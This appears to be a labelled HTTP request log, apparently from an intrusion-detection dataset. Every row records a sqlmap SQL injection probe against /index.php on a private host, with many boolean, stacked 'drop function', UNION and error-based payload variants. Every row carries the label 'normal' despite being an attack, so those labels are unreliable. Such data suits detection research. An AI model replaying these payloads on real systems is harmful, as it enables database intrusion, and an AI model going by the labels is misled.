/,,*/* close,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%') 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%')) 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%'))) 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"") 2948) then 1 else 0 end) limit 1-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%""))) 8633) then 1 else 0 end) limit 1-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') where 3915=3915 7772) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') where 1874=1874 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") where 7350=7350 2621) then 1 else 0 end) limit 1-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' where 7528=7528 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" where 3911=3911 3224) then 1 else 0 end) limit 1-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" where 2398=2398 2621) then 1 else 0 end) limit 1-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'truy' from dual where 3793=3793 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'ompz' where 4917=4917 9649) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' (select ioxe where 4115=4115 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs')) as ervz where 7443=7443 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') as zmqu where 8557=8557 5815) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") as lczw where 4073=4073 5300) then 1 else 0 end) limit 1-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs))) 6475) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs where 2692=2692 2621) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) as xows where 8683=8683 2494) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs`) where 3735=3735 3585) then 1 else 0 end) limit 1-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') 7800) select 9851 else drop function toha-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' 7538) select 4719 else drop function cxpq-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" 4501) select 4501 else drop function dgun-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs')) 6821) select 2609 else drop function zmyw-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'))) 8401) select 7618 else drop function fpda-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") 4501) select 4501 else drop function dgun-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%') 2085) select 8739 else drop function ytze-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%') 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"") 9303) select 4783 else drop function juif-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"")) 5949) select 1029 else drop function goan-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%""))) 3657) select 4980 else drop function bahp-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%""))) 4501) select 4501 else drop function dgun-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"" 4155) select 4411 else drop function foha-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') where 9014=9014 8186) select 1779 else drop function oehu-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") where 4679=4679 9117) select 5676 else drop function epcw-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' where 3880=3880 9269) select 4215 else drop function vini-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" where 8821=8821 1860) select 9946 else drop function retn-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'xsej' from dual where 9597=9597 2577) select 3868 else drop function qgmv-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'fowo' where 5589=5589 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' (select zklh where 6290=6290 5781) select 4699 else drop function gbhw-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' (select 'yntl' where 9737=9737 3990) select 4093 else drop function dslh-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs')) as lljn where 1299=1299 6710) select 6016 else drop function zzct-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"")) as qwjm where 6966=6966 9582) select 5618 else drop function yued-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') as fmwq where 1960=1960 8258) select 9407 else drop function rqje-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") as hozj where 5926=5926 7880) select 1539 else drop function hdqc-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' in boolean mode) 8134) select 7875 else drop function ltsp-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' in boolean mode) 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) 6325) select 1167 else drop function eqzp-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs)) 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) where 7689=7689 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs where 6738=6738 8991) select 7979 else drop function tmke-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs)) as lwaf where 9859=9859 1831) select 2998 else drop function zxms-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) as tqjl where 9601=9601 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs` where 9874=9874 7325) select 3716 else drop function omky-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs` where 2201=2201 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs`) where 6995=6995 1349) select 3818 else drop function kgoc-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs`) where 2791=2791 4501) select 4501 else drop function dgun-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') 2199) then 1 else 5172*(select 5172 union all select 2199) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' 1401) then 1 else 6516*(select 6516 union all select 1401) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'))) 5851) then 1 else 5927*(select 5927 union all select 5851) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"")) 1488) then 1 else 7667*(select 7667 union all select 1488) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"")) 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs""))) 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%') 6428) then 1 else 6322*(select 6322 union all select 6428) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%')) 2286) then 1 else 7146*(select 7146 union all select 2286) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%')) 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%'))) 1043) then 1 else 8700*(select 8700 union all select 1043) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' 4485) then 1 else 2534*(select 2534 union all select 4485) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"") 3176) then 1 else 1828*(select 1828 union all select 3176) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"")) 3869) then 1 else 8735*(select 8735 union all select 3869) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%""))) 2163) then 1 else 3482*(select 3482 union all select 2163) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%""))) 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"" 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') where 6223=6223 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") where 4039=4039 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" where 4844=4844 1729) then 1 else 2901*(select 2901 union all select 1729) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'cxgc' from dual where 3271=3271 1868) then 1 else 3933*(select 3933 union all select 1868) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'qbso' from dual where 4495=4495 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'tarj' where 7403=7403 6635) then 1 else 5498*(select 5498 union all select 6635) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' (select wuxe where 2123=2123 3132) then 1 else 1120*(select 1120 union all select 3132) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' (select 'down' where 2008=2008 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"")) as ilwc where 6772=6772 1918) then 1 else 4316*(select 4316 union all select 1918) end)-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') as lvob where 2865=2865 9591) then 1 else 8333*(select 8333 union all select 9591) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') as uykz where 1515=1515 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs)) 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs))) 6886) then 1 else 8232*(select 8232 union all select 6886) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) where 6509=6509 4799) then 1 else 7576*(select 7576 union all select 4799) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) where 7963=7963 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs)) as pvuh where 1448=1448 3673) then 1 else 1421*(select 1421 union all select 3673) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs)) as hvio where 8037=8037 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) as bydj where 7774=7774 9998) then 1 else 6387*(select 6387 union all select 9998) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) as vnww where 8206=8206 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs`) where 2861=2861 8520) then 1 else 7022*(select 7022 union all select 8520) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs`) where 4094=4094 2524) then 1 else 2524*(select 2524 union all select 9792) end)-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') 8630) then 4249 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' 1926) then 2320 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs')) 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") 5691) then 2728 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs""))) 1454) then 2398 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%')) 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%'))) 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"") 6212) then 9293 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"") 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%""))) 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%"" 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") where 2822=2822 8321) then 5428 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") where 8805=8805 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" where 9294=9294 6341) then 6637 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'iwrs' from dual where 1936=1936 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs'||(select 'kaqy' where 7141=7141 4410) then 5111 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' (select aetq where 1981=1981 7819) then 4281 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' (select 'dqgt' where 7475=7475 4692) then 3700 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs')) as suxa where 2138=2138 6380) then 2431 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"")) as xyji where 3224=3224 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') as jhfr where 9333=9333 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs))) 2468) then 8735 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) where 8170=8170 3756) then 2571 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs)) as fprl where 7807=7807 5362) then 2578 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs` where 8068=8068 9318) then 9318 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",edfs`) where 9201=9201 3262) then 4605 else cast(1 as int)/(select 0 from dual) end) from dual-- sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' 1004,1,1/0) sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' 9445,1,1/0) sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" 6063,1,1/0) sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"" 9445,1,1/0) sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs')) 6779,1,1/0) sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs')) 9445,1,1/0) sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs'))) 1125,1,1/0) sdwa",normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","edfs"") 9445,1,1/0) sdwa",normal
